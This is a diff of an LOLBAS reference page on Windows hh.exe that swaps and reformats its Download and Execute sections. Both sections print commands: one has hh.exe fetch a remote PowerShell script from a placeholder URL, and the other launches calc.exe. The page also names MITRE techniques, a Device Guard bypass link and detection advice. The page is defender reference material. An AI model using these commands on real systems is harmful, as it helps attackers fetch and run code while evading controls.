@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Hh/#execute">Execute</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Hh/#download">Download</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Hh/#download">Download</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Hh/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>Binary used for processing chm files in Windows</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,90 +57,69 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/">https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/</a></li>
+	<a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/">https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>hh.exe should normally not be in use on a normal workstation</li>
+	hh.exe should normally not be in use on a normal workstation
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Executes calc.exe with HTML Help.</p>
-
-		Usecase:Execute process with HH.exe
-        <pre><code>HH.exe c:\windows\system32\calc.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1216">T1216</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Open the target PowerShell script with HTML Help.</p>
-
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Open the target PowerShell script with HTML Help.
+		<br>
+		<pre><code>HH.exe http://some.url/script.ps1</code></pre>
 		Usecase:Download files from url
-        <pre><code>HH.exe http://some.url/script.ps1</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Executes calc.exe with HTML Help.
+		<br>
+		<pre><code>HH.exe c:\windows\system32\calc.exe</code></pre>
+		Usecase:Execute process with HH.exe
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1216">T1216</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
